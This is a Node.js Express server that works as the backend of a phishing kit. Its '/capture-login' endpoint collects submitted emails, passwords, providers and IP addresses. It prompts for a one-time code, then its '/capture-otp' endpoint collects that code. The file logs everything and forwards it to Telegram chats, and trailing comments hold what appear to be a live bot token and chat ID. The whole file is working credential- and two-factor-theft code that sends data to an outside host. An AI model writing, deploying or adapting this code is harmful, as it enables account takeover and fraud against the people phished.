const express = require("express");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");
const app = express();

app.use(cors({ origin: true }));
app.options(/.*/, cors({ origin: true }));
app.use(express.json());

// ── Telegram Bot Setup ──
const TOKEN = process.env.TELEGRAM_TOKEN || "";
const CHAT_IDS = [
  process.env.TELEGRAM_CHAT_ID,
  process.env.SECOND_TELEGRAM_CHAT_ID,
].filter(Boolean);

let bot;
if (TOKEN) {
  bot = new TelegramBot(TOKEN, { polling: false });
} else {
  console.warn(
    "⚠️  TELEGRAM_TOKEN is not configured; Telegram alerts will be disabled.",
  );
}

async function sendTelegramAlert(title, details) {
  const message = `🔐 *${title}*\n\n${details}`;

  if (!bot || CHAT_IDS.length === 0) {
    console.warn(
      "Telegram alert skipped because bot or chat ID is not configured."
    );
    return;
  }

  for (const chatId of [...new Set(CHAT_IDS)]) {
    try {
      await bot.sendMessage(chatId, message, {
        parse_mode: "Markdown",
      });

      console.log("Telegram alert sent successfully.");
    } catch (err) {
      console.error("Telegram send failed:", err.message);
    }
  }
}

app.post("/capture-login", (req, res) => {
  const { email, password, provider } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const time = new Date().toLocaleString();

  // Console logging
  console.log("=======================");
  console.log(`Login Attempt`);
  console.log(`Provider: ${provider}`);
  console.log(`Email : ${email}`);
  console.log(`Password : ${password}`);
  console.log(`IP: ${ip}`);
  console.log(`Time : ${time}`);
  console.log("==================================");

  // Telegram alert
  const telegramMsg = `*Provider:* ${provider}\n*Email:* ${email}\n*Password:* ${password}\n*IP:* ${ip}\n*Time:* ${time}`;
  sendTelegramAlert("LOGIN ATTEMPT", telegramMsg);

  res.json({ requireOTP: true });
});

app.post("/capture-otp", (req, res) => {
  const { otp } = req.body;
  const time = new Date().toLocaleString();

  console.log("=======================");
  console.log(`OTP Capture`);
  console.log(`OTP Code : ${otp}`);
  console.log(`Time : ${time}`);
  console.log(`==================================`);

  // Telegram alert
  const telegramMsg = `*OTP Code:* ${otp}\n*Time:* ${time}`;
  sendTelegramAlert("OTP RECEIVED", telegramMsg);

  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  if (!TOKEN || CHAT_IDS.length === 0) {
    console.log(
      "⚠️  WARNING: Telegram environment variables are not fully configured. Set TELEGRAM_TOKEN and TELEGRAM_CHAT_ID in Render or your environment.",
    );
  } else {
    console.log("✅ Telegram alerts enabled");
  }
});


// TELEGRAM_TOKEN=7948054500:AAFdarEUeMMl4Y1SBs4cAnk9ikySJ8C9f
// TELEGRAM_CHAT_ID=5859927427